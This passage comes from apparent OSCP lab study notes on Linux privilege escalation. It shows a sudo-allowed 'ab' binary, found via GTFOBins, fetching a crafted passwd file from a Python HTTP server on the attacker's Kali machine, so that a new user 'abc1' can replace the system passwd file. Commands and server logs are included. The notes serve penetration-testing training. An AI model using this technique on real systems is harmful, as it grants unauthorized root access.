...
now we have a new user with name "abc1"

now i want to replace the orginal passwd file with my new passwd file

but i dont have the permission because kali user doesnt have permission for that and oscp user also doesnt hve permission to chnage the file

we go to gtfo bins again 

![](attachments/image-95.png)

now we will sytart the python server on our attacker machine which is kali

```
python -m http.server 80
```

we are using port 80 and its http port 
we can choose another port also , it all depends on you
you can change port to for ex. 8080 also


so a python server boradcatss all the files in cureent folder all over the network
if you have a domain or a public ip , on that also things will show up 

if we serach up our ip in the browswer well see the files being shared

![](attachments/image-97.png)


now on our other user "oscp" 

well run this command 

we ll go to gtfo bins ab coomand , sudo user tab and run : 
...
tweaking the coomand for running

```
sudo ab -v2 http://192.168.1.10:80/passwd
```
...
Benchmarking 192.168.1.10 (be patient)...INFO: GET header == 
---
GET /passwd HTTP/1.0
Host: 192.168.1.10
...
Date: Sun, 28 Jun 2026 13:42:08 GMT
Content-type: application/octet-stream
Content-Length: 3490
Last-Modified: Sun, 21 Jun 2026 02:18:52 GMT                                                    
...
Transfer rate:          2188.38 [Kbytes/sec] received
...
192.168.1.10 - - [28/Jun/2026 09:35:22] "GET / HTTP/1.1" 200 -
192.168.1.10 - - [28/Jun/2026 09:35:22] code 404, message File not found
192.168.1.10 - - [28/Jun/2026 09:35:22] "GET /favicon.ico HTTP/1.1" 404 -
192.168.1.10 - - [28/Jun/2026 09:37:51] "GET / HTTP/1.1" 200 -
192.168.1.10 - - [28/Jun/2026 09:42:08] "GET /passwd HTTP/1.0" 200 -
```

we'll receive our file
